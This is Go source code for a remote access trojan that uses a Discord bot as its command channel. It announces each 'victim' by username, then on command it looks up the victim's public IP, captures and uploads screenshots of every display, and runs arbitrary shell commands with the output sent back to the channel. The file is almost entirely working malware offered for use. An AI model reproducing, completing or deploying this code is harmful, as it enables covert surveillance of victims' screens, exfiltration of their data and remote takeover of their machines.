package main

import(
	"fmt"
	"time"
	"flag"
	"strings"
	"strconv"
	"os"
	"os/user"
	"io"
	"net/http"
	"image/png"
	"math/rand"
	"golang.org/x/net/html"
	"github.com/go-cmd/cmd"
	"github.com/kbinani/screenshot"
	"github.com/bwmarrin/discordgo"
)

var(
	first int = 0
	kill int = 0
	username string
	id string

	channel_id []string
)

/* helpers */
func rand_str(num int) (string) {
	abc := "abcdefghijklmpqrstuvwxyz"
	bytes := make([]byte, num)
	
	for q := 0; q < num; q++ {
		bytes[q] = abc[rand.Intn(len(abc))]
	}
	return string(bytes)
}

func html_parse(body string) ([]string) {
	tokenizer := html.NewTokenizer(strings.NewReader(body))
	var data []string
	var check int = 0
	for {
		tn := tokenizer.Next()
		switch {
		case tn == html.ErrorToken:
			return data
		case tn == html.StartTagToken:
			t := tokenizer.Token()
			if t.Data == "h2" {
				check = 1
			}
		case tn == html.TextToken:
			t := tokenizer.Token()
			if check == 1 {
				data = append(data, t.Data)
			}
			check = 0
		}
	}
}

func take_ss() ([]string) {
	var files []string 
	num := screenshot.NumActiveDisplays()
	for q := 0; q < num; q++ {
		bounds := screenshot.GetDisplayBounds(q)
		img, _ := screenshot.CaptureRect(bounds)

		file, _ := os.Create("ss" + strconv.Itoa(q) + ".png")
		png.Encode(file, img)
		
		files = append(files, "ss" + strconv.Itoa(q) + ".png")

		file.Close()
	}

	return files
}
/* helpers */

/* sending */
func send_msg(s *discordgo.Session, msg string) {
	for _, v := range channel_id {
		fmt.Println(v)
		s.ChannelMessageSend(v, msg)
	}
}

func send_ss(s *discordgo.Session, files []string, channel_id string) {
	for _, v := range files {
		fss, _ := os.Open(v)	
		msg_data := discordgo.MessageSend{
			Content: "",
			TTS: false,
			File: &discordgo.File{Name: rand_str(5) + ".png", ContentType: "image", Reader: fss},
		}
		s.ChannelMessageSendComplex(channel_id, &msg_data)
		
		fss.Close()
	}
}
 
//func send_embed() {
//var embed discordgo.MessageEmbed
//embed.Type = discordgo.EmbedTypeImage
//var img_shit discordgo.MessageEmbedImage = discordgo.MessageEmbedImage{URL: "C:/msys64/home/22noa/projects/go/src/github.com/0xSegFaulted/demise/ss0.png", Width: 100, Height: 100,}
//embed.Image = &img_shit	
//s.ChannelMessageSendEmbed(channel_id[1], &embed)
//}
/* sending */

/* callbacks */
func ready_callback(s *discordgo.Session, event *discordgo.Ready) {
	ch, _ := s.UserChannelCreate(id)
	channel_id = []string{ch.ID, ""} // backdoor channel id
	send_msg(s, "@here Victim Connected: " + username)
}

func msg_callback(s *discordgo.Session, m *discordgo.MessageCreate) {
	if m.Author.ID == s.State.User.ID {
		return
	}
	
	if m.Content == "$victims" {
		send_msg(s, "@here" + username)
	} else if m.Content == "$kill " + username {
		kill = 1
	} else if m.Content == "$ip " + username {
		ip_http, _ := http.Get("https://www.showmyip.com")
		ip_body, _ := io.ReadAll(ip_http.Body)
		output := html_parse(string(ip_body))
		send_msg(s, "ip: " + output[0])
		ip_http.Body.Close()
	} else if m.Content == "$geoloc " + username {
		send_msg(s, "location: ")
	} else if m.Content == "$ss " + username {
		ss_files := take_ss()
		send_ss(s, ss_files, channel_id[0])
		send_ss(s, ss_files, channel_id[1])
	} else if strings.Contains(m.Content, "$shell " + username) {
		command_splice := strings.Split(m.Content, username + " ")
		fmt.Println(command_splice[1:])
		command := strings.Join(command_splice[1:], "")
		fmt.Println(command)
	
		cmd_test := cmd.NewCmd(command)
		cmd_status := <-cmd_test.Start()
		for _, v := range cmd_status.Stdout {
			send_msg(s, v)
		}
	}
}
/* callbacks */

func main() {
	flag.StringVar(&id, "id", "", "Author ID")
	flag.Parse()

	rand.Seed(time.Now().UnixNano())

	u, _ := user.Current()
	username = u.Username
	
	dg, e := discordgo.New("Bot ")
	if e != nil {
		fmt.Printf("error New(): %v\n", e)
	}
	dg.AddHandler(ready_callback)
	dg.AddHandler(msg_callback)
	dg.Identify.Intents = discordgo.IntentsGuildMessages

	e = dg.Open()
	if e != nil {
		fmt.Printf("error: %v\n", e)
	}

	fmt.Println("bot is running")

	for {
		if kill == 1 {
			break
		}
		time.Sleep(10000)
	}

	dg.Close()
}
